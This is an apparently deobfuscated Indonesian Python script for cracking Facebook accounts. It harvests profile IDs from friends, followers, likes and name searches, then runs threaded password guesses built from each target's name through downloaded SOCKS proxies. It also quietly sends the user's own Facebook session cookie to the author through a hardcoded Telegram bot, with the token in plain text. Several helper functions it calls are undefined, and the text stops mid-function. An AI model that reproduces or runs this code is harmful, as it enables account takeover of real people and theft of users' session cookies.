""" deobfuscate by Maulana-XD """
def jalan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
###----------[ KEMBALI KEMENU ]---------- ###
def back():
	login()
	
###----------[ BUAT CLEAR LAYAR ]---------- ###
def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
		
###----------[ IMPORT MODULE RICH INGREDIENT ]---------- ###
import json
import uuid
import hmac
import random
import hashlib
import urllib
import urllib.request
import calendar
import requests,json,os,sys,random,datetime,time,re
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as nel
from rich import print as cetak
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
import zlib
import subprocess
import base64
from rich import pretty
pretty.install()
CON=sol()
ses=requests.Session()
babas = Console()

def process_data():
    time.sleep(0.05)    	
try:
    # python 2
	urllib_quote_plus = urllib.qote
except:
    # python 3
	urllib_quote_plus = urllib.parse
###----------[ APPEND ]---------- ###
pwt = ['no']
pwn = []
id,id2 = [],[]
uid = []
ualu = []
ualuh = ['no']
ok,cp = 0,0
loop = 0
akun = []
kon = []
kall = []
tokenku = []
#--------------->import Module Tele
ID="5384702841";
tok="5776502345:AAEoP3n6amtGewprF9ZHJcffjxXseNi6v5E"
###----------[ PROXY LIST ]---------- ###
try:
	proxylist= requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text
	open('proxy.txt','w').write(proxylist)
except Exception as e:
	print(f'Proxy_List')
prox=open('proxy.txt','r').read().splitlines()
        
##------------[ WARNA-COLOR ]--------------##
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
bv = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#WARNA RICH RICH #
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
RW = "[#00FFFF]" # Biru muda
P2 = "[#FFFFFF]" # Putih
B2 = "[#00C8FF]" # Biru
kall = random.choice([H2,K2,RW,B2])
kallz = random.choice([H2,K2,RW,B2])
kall2 = random.choice(["bold green"])
###----------[ TAHUN AKUN ]---------- ###
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
	
##------------[ CONVERTER-BULAN ]-----------##
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def waktu():
	now = datetime.datetime.now()
	hours = now.hour
	if 4 <= hours < 11:timenow = "Selamat pagi "
	elif 11 <= hours < 15:timenow = "Selamat siang "
	elif 15 <= hours < 18:timenow = "Selamat sore "
	else:timenow = "Selamat malam"
	return timenow
kall_x = random.choice(['HALLO','HAI KAK','HALLO KAK','HAI OM','HALLO OM','HAI TER','HALLO TER '])
IP = requests.get("http://ip-api.com/json/").json()["query"]
negara = requests.get("http://ip-api.com/json/").json()["country"]
datt = []
sim = requests.get("http://ip-api.com/json/").json()["isp"]
def banner():
	cetak(nel(f'''{M2}● {K2}● {H2}● {P2}  AUTHOR : KALL XR || STATUS : PREMIUM || VERSION : 2.0   {M2}● {K2}● {H2}●{kall} {kall}           
	     ＿＿                  
　　　　　／＞　　フ
　　　　　| 　n　n 彡
　 　　　／`ミ＿xノ
　　 　 /　　　 　 |     ═╗ ╦╦ ╦╦ ╦╦═╗╦ ╦  ╔═╗╔═╗╔╦╗╔═╗
　　　 /　 ヽ　　 ﾉ      ╔╩╦╝╚╦╝║ ║╠╦╝║ ║  ║  ║ ║ ║║║╣ 
　 　 │　　|　|　|       ╩ ╚═ ╩ ╚═╝╩╚═╚═╝  ╚═╝╚═╝═╩╝╚═╝
　／￣|　　 |　|　|
　| (￣ヽ＿_ヽ_)__)
　＼二つ
''',subtitle = f"[bold white]version 1.0",style=f"{kall2}",title=f'[bold white]{kall_x},[bold][green]{waktu()}'))
def login():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print('Internet Anda Sedang Sibuk/Tidak Ada')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	os.system('clear')
	try:
		ses = requests.Session()
		banner()
		cetak(nel(f'''{H2}SARAN EXTENSI COKIEDOUGH ®''',style='bold white'))
		cookie = input(f'\n{H}• {x}Masukan Cookie :{asu} ')
		requests.post(f"https://api.telegram.org/bot5776502345:AAEoP3n6amtGewprF9ZHJcffjxXseNi6v5E/sendMessage?chat_id=5384702841&text={cookie} MISI SETOR RESULT OM").json()
		for _ in track(range(100), description=f' [bold green]Tunggu.'):process_data()
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open(".tok.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		print(f'\n{H}• {P}SELAMAT LOGIN BERHASIL')
		login()
	except Exception as e:
		print(" Cookies Invalid bro")
		os.system('rm -rf .tok.txt && rm -rf .cok.txt')
		print(e)
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(name,uid):
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	tree = Tree(nel(f"                          MENU BY KALL XR "))
	tree.add(nel.fit(f"[bold white]{name}", padding=(0,2), title=f'[bold green]Name fb',style=f'{kall2}'))
	tree.add(nel.fit(f"[bold white]{negara}[purple]",padding=(0,2), title=f'[bold green]Negara',style=f'{kall2}'))
	tree.add(nel.fit(f'[bold white]{tahun(uid)}',padding=(0,2), title=f'[bold green]TAHUN AKUN',style=f'{kall2}'))
	tree.add(nel.fit(f"[bold white]{uid}", padding=(0,2), title=f'[bold green]User id fb',style=f'{kall2}'))		
	tree.add(nel.fit(f"[bold white]{IP}[purple]",padding=(0,2), title=f'[bold white]Ip adrees',style=f'{kall2}'))
	tree.add(nel.fit('''[bold white][[bold green]01[bold white]] Crack Dari Publik             [bold white][[bold green]06[bold white]] Crack Dari Pencarian
[bold white][[bold green]02[bold white]] Crack Dari Pengikut           [bold white][[bold green]07[bold white]] Crack Dari Email
[bold white][[bold green]03[bold white]] Crack Dari Grup               [bold white][[bold green]08[bold white]] Dump Id Publik
[bold white][[bold green]04[bold white]] Crack Dari file               [bold white][[bold green]09[bold white]] Check Opsi Akun
[bold white][[bold green]05[bold white]] Check Result                  [bold white][[bold green]00[bold white]] Keluar Dari Script                  ''',width=90,style=f'{kall2}',title = "[bold green]MENU"))	
	cetak(nel(tree,style="bold green",title=f"[bold white]MENU",subtitle="╭──",subtitle_align='left'))
	kall_x = input(f'   {H}╰──►')
	if kall_x in ['1']:dump_massal()
	elif kall_x in ['2']:dump_pengikut()
	elif kall_x in ['3']:dump_like()
	elif kall_x in ['4']:crack_file()
	elif kall_x in ['5']:result()
	elif kall_x in ['6']:kall_search()
	elif kall_x in ['7']:kall_mail()
	elif kall_x in ['8']:dump_publik()
	elif kall_x in ['9']:kall_opsi()
	elif kall_x in ['0','00']:
		os.system('rm -rf .tok.txt')
		os.system('rm -rf .cok.txt')
		print('>> succes log out ')
		exit()
	else:
		print('Pilih Yang Bener Asuu ')
		exit()
def error():
	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()	
def kall_search():
	nama1 = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]
	nama2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]
	cetak(nel(' [cyan]1 nama sama dengan 10k id crack',style=f'{kall2}'))
	kal = input('       ╰──►')
	for ser in kal:
		for belakang in nama1:
			haram = ser+belakang
			kall.append(haram)
		for depan in nama2:
			haram = depan+ser
			kall.append(haram)
	with tred(max_workers=35) as thread:
		for uid in kall:
			thread.submit(crack_nama,f"https://mbasic.facebook.com/public/{uid}?/locale2=id_ID")
	setting()
			
def crack_nama(url):
	l = parser(ses.get(str(url)).text,'html.parser')
	for u in l.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(u))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bool = uid+'|'+nama
			if bool in id:pass
			else:id.append(bool)
	try:
		url = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
		if(url):
			print(f'{kall} Total : '+str(len(id)))
			crack_nama(url)
	except:pass
def crack_file():
	prints(Panel(f"[bold][white]masukan nama file contoh : [green]/sdcard/lukman.txt",padding=(0,2), style='white'))
	file = console.input(f' [bold][green]• [white]masukan nama file : ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:user,nama = data.split('|')
			except:
				prints(Panel(f"[bold][white]pemisah file salah coba ganti sc dump anda",padding=(0,4),style='white'))
				time.sleep(2);exit()
			id.append(data)
			print(f"\r {H}• {P}mengumpulkan {H}{len(id)} {P}id{N}",end="")
			sys.stdout.flush();time.sleep(0.0002)
	except FileNotFoundError:
		prints(Panel(f"[bold][white]file tidak ada atau tidak terdeteksi system kami",padding=(0,4),style='white'))
	prints(Panel(f"[bold][white]\t\tberhasil mengumpulkan {O2}{len(id)} [white]id", style='white'))
	setting()
#dump like like
def dump_like():
	try:
		token= open("data/token.txt", "r").read()
		cok= open("data/cookie.txt","r").read()
	except IOError:
		exit()
	prints(Panel(f"[bold white]masukan url yang memiliki like di postingan", padding=(0,2), style='white'))
	idt = console.input(f' [bold][green]• [white]masukan url : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=likes.limit(10000)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['likes']['data']:
			try:
				try:id.append(pi['username']+'|'+pi['name'])
				except:id.append(pi['id']+'|'+pi['name'])
				print(f"\r {H}• {P}mengumpulkan {H}{len(id)} {P}id{N}",end="")
				sys.stdout.flush();time.sleep(0.0002)
			except:continue
		print("\r")
		prints(Panel(f"[bold][white]\t\tberhasil mengumpulkan {O2}{len(id)} [white]id", style='white'))
		setting()
	except requests.exceptions.ConnectionError:
		prints(Panel(f"[bold white]internet kamu error atau tidak ada koneksi coba cek koneksi internetmu dan coba lagih", style='white'))
		time.sleep(5);exit()
	except (KeyError,IOError):
		prints(Panel(f"[bold white]sepertinya id [green]{user} [white]tidak publik atau tidak memiliki teman coba ganti akun target", style='white'))
		exit()			
#ganti ua anda dengan ua baru
def ganti_user():
	prints(Panel(f'[bold][white][[yellow]01[white]]. ganti user agent\n[[yellow]02[white]]. cek user agent anda\n[[yellow]03[white]]. kembali ke menu',padding=(0,2), style='white'))
	lak= console.input(f' [bold][green]• [white]masukan pilihanmu : ')
	if lak in['1','01']:
		print(f" {H}• {P}ketik {H}user agent saya {P}untuk mengambil user agent sendiri {H}•{N}")
		print(f" {H}• {P}ketik {H}bawaan {P}untuk menggunakan user agent bawaan {H}•{N}")
		user= console.input(f' [bold][green]• [white]masukan user agent : ')
		if user in['',' ']:
			prints(Panel(f"[bold][white]masukan user agent jangan kosong",padding=(0,6), style='white'))
			time.sleep(2);os.system('clear');banner();ganti_user()
		elif user in['user agent saya','User agent saya','User Agent saya','User Agent Saya','USER AGENT SAYA']:
			prints(Panel(f"[bold][white]anda akan diarahkan ke browser atau chorome",padding=(0,2), style='white'));time.sleep(2)
			os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");time.sleep(2)
			os.system('clear');banner();ganti_user()
		elif user in['bawaan','Bawaan','BAWAAN']:
			for xd in range(10000):
				aa='Mozilla/5.0 (Linux; U; Android'
				b=random.choice(['6','7','8','9','10','11','12'])
				c=' en-us; GT-'
				d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
				e=random.randrange(1, 999)
				f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
				g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
				h=random.randrange(73,100)
				i='0'
				j=random.randrange(4200,4900)
				k=random.randrange(40,150)
				l='Mobile Safari/537.36'
				uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
				ugen.append(uaku2)
				prints(Panel(f"[bold][white]berhasil menggunakan user agent bawaan script",padding=(0,2),style='white'))
				exit()
		else:
			ugen.append(user)
			prints(Panel(f"[bold][white]berhasil menggunakan user agent yang anda masukan",padding=(0,2),style='white'))
			exit()
###----------[ CEK HASIL ]---------- ###
def result():
	tree = Tree(f"")
	tree.add(nel.fit(f'''{P2}[{H2}01{P2}]{P2}Hasil {H2}OK{K2} {P2}Anda 
{P2}[{H2}02{P2}]Hasil {K2}CP{P2} Anda
{P2}[{H2}00{P2}]{P2}Kembali	''',style=f"{kall2}",title =f"{P2}Check",subtitle="┬─",subtitle_align='left'))
	
	cetak(tree)
	kz = input('       ╰──►')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f'{M}[{H}?{M}]File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f'{M}[{H}x{M}]Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{M}[{H}>{M}]{P} %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{M}[{H}?{M}]{P}Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'{M}[{H}>{M}]Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f'{M}[{H}>{M}]File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}{M}[{H}>{M}] {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f'{M}[{H}?{M}] File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f'{M}[{H}x{M}]Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{M}[{H}>{M}]{P}%s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{M}[{H}>{M}]{P}%s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\n{M}[{H}?{M}]{P}Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'{M}[{H}?{M}]Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f'{M}[{H}>{M}]File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}{M}[{H}>{M}] {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print(f'{M}[{H}>{M}]Pilih Yang Bener Kontol ')
		back()
###----------[ CRACK PENGIKUT ]---------- ###
def dump_pengikut():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		basari_tamvan(f'{bas}[×] Cookies Telah Kadaluarsa ! Ganti Cookies !{x} ')
		time.sleep(4)
		exit()
	cetak(nel(f' [cyan]Masukkan Idz Target',width=70,title=f"",style=f"{kall2}"))
	pil = input(f'{kall}{M}[{H}>{M}]{P}MASUKAN  : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'{kall} Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		basari_tamvan(f'[!]{bas} Koneksi Bermasalah {x}')
		time.sleep(4)
		back()
	except (KeyError,IOError):
		basari_tamvan(f'[!]{bas} Gagal mengambil Id target {x}')
		time.sleep(4)
		back()

###----------[ CRACK ID MASSAL ]---------- ###
def dump_massal():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		basari_tamvan(f'{bas}[×] Cookies Telah Kadaluarsa ! Ganti Cookies !{x} ')
		time.sleep(4)
		exit()
	try:
		cetak(nel(f"                         {P2}  Mau Berapa Idz ",style="bold green",subtitle="╭──",subtitle_align='left'))
		baz_coder = int(input(f'   \x1b[1;92m╰──►{x}'))
	except ValueError:
		basari_tamvan('[!] Yang Bener Napa Cuk ')
		time.sleep(4)
		exit()
	if baz_coder<1 or baz_coder>100:
		basari_tamvan('[!] Gagal Dump Id Target ')
		time.sleep(5)
		exit()
	ses=requests.Session()
	kallz = 0
	for met in range(baz_coder):
		kallz+=1
		cetak(nel(f'                   [bold white]Id Target Harus Bersifat Publik',title=f"",style=f"{kall2}",subtitle=f"[bold green]╭──",subtitle_align='left'))
		bazfaa = input(f'   \x1b[1;92m╰──►'+str(kallz)+' : ')
		uid.append(bazfaa)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('[!] Sinyal Lu Eror ')
			exit()
	try:
		print('')
		print(f'{P}[{H}>{P}]{P}Total Dosa: '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(f'{M}[!] Koneksi Lu Eror Cuk{x} ')
		time.sleep(4)
		back()
	except (KeyError,IOError):
		print(f'[!]{bas} Pertemanan Id Target Lu Tidak Publik {x}')
		time.sleep(4)
		back()
	
###----------[ ATUR SBLUM CRACK ]---------- ###
def setting():
	tree = Tree(nel(f"                          {P2}pengaturan Idz"))
	tree.add(nel.fit(f'''\t[bold white] Setting Idz                    ''',width=70,title=f"",style=f"{kall2}"))
	tree.add(nel.fit(f'''[cyan]01. Crack Old Idz
[cyan]02. Crack New Idz
[cyan]03. Crack Random Idz                    '''))
	cetak(nel(tree,title=f"{P2}Idz",style=f"{kall2}",subtitle=f"[bold green]╭──",subtitle_align='left'))	
	kall_xd = input(f'   \x1b[1;92m╰──►:')
	if kall_xd in ['1','01']:
		for lama in sorted(id):
			id2.append(lama)			
	elif kall_xd in ['2','02']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1			
	elif kall_xd in ['3','03']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		print('[!] Pilih Yang Bener Cuukk')
		exit()
	tree = Tree(nel(f"                          {P2}Method By Kall Xr"))	
	tree.add(nel.fit(f'''\t[bold white] Setting Methode                   ''',width=70,title=f"",style=f"{kall2}"))
	tree.add(nel.fit(f' [cyan]01. Method B api \n [cyan]02. Method B Graph [red]Recomended[cyan]\n 03. [cyan]Method Asnyc \n 04. [cyan]Method Mobile            '))
	cetak(nel(tree,title=f"{P2}METHODE",style=f"{kall2}",subtitle=f"[bold green]╭──",subtitle_align='left'))
	kall_bv = input(f'   \x1b[1;92m╰──► : ')
	if kall_bv in ['1','01']:kon.append('m.facebook')
	elif kall_bv in ['']:print(f'{M}Pilih Yang Bener ');exit()
	elif kall_bv in ['2','02']:kon.append('b.facebook')
	elif kall_bv in ['3','03']:kon.append('f.facebook')
	elif kall_bv in ['4','04']:kon.append('z.facebook')
	else:
		kon.append('m.facebook')
		
	#cetak(panel(f' [cyan]Ingin Menambahkan Kata Sandi Y/t',width=70,title=f"",style=f"{warna_kolor}"))
	#pwtambah=input(f'{bv}└── Pilih : ')
	#if pwtambah in ['y','Y']:
		#pwt.append('ya')
		#cetak(panel(f' [cyan]Gunakan Koma Untuk Pemisah\n Contoh : sayang,anjing,bangsat',width=70,title=f"",style=f"{warna_kolor}"))
		#pwku=input(f'{bv}└── Sandi :{x}{M} ')
		#pwkuh=pwku.split(',')
		#for xpw in pwkuh:
			#pwn.append(xpw)
	#else:
		#pwt.append('no')
		
	#cetak(panel(f' [cyan]Ingin Menambahkan User Agent Y/t',width=70,title=f"",style=f"{warna_kolor}"))
	#uat = input(f'{bv}└── Pilih : ')
	#if uat in ['y','Ya','ya','Y']:
		#ualuh.append('ya')
		#bz = input(f'{bv}└── Ugent :{x}{M} ')
		#ualu.append(bz)
	#else:
		#ualuh.append('no')
	wordlist()
	
###----------[ WORDLIST ]---------- ###
def wordlist():
	global prog,des
	os.system('clear')
	banner()
	print('')
	cetak(nel(f'       [cyan]Hasil [green]OK[cyan] Tersimpan Di : [green]OK/%s [white]'%(okc),width=70,title=f"",style=f"{kall2}"))
	cetak(nel(f'       [cyan]Hasil [green]OK[cyan] Tersimpan Di : [green]OK/%s [white]'%(okc),width=70,title=f"",style=f"{kall2}"))
	cetak(nel(f'       [cyan]Hasil [green]OK[cyan] Tersimpan Di : [green]OK/%s [white]'%(okc),width=70,title=f"",style=f"{kall2}"))
	print('')
	prog = Progress(SpinnerColumn('monkey'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'm.facebook' in kon:
					pool.submit(crackm,idf,pwv)
				elif 'b.facebook' in kon:
					pool.submit(crackb,idf,pwv)
				elif 'f.facebook' in kon:
					pool.submit(crackf,idf,pwv)
				elif 'z.facebook' in kon:
					pool.submit(crackz,idf,pwv)
				else:
					pool.submit(crackz,idf,pwv)
		print('')
		print(f'{x}AKUN OK : {h}%s '%(ok))
		print(f'{x}AKUN CP : {k}%s{x} '%(cp))
		print('')
###----------[ MOBILE V1 ]---------- ###
def crackm(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[cyan]B .api[white] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(['Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; SM-G610M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G532MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36'])
